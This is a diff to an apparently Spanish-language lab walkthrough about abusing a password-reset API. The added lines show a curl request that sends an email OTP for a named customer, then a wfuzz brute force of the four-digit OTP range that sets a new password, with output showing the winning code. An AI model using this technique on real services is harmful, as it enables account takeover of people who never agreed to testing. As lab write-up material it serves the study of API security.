@@ -22,6 +22,30 @@ Tenemos a nuestra disposición otro método de la API, que permite el envío de 
 
 ![api_otp](img/reset_password_1.png)
 
+```bash
+# curl -X 'POST' 'http://94.237.60.154:52829/api/v1/authentication/customers/passwords/resets/email-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email": "MasonJenkins@ymail.com"}'
+{"SuccessStatus":true}
+```
+
+```bash
+# wfuzz -c --hh 23  --hc 404 -u http://94.237.60.154:52829/api/v1/authentication/customers/passwords/resets -z range,1-9999 -H "Content-Type: application/json" -d '{"Email": "MasonJenkins@ymail.com", "NewPassword": "Test1234", "OTP":"FUZZ"}'
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+Target: http://94.237.60.154:52829/api/v1/authentication/customers/passwords/resets
+Total requests: 9999
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
+=====================================================================
+000007435:   200        0 L      1 W        22 Ch       "7435"                                                                                                                                                            
+Total time: 51.76655
+Processed Requests: 9999
+Filtered Requests: 9998
+Requests/sec.: 193.1555
+
+```
+
 
 
 
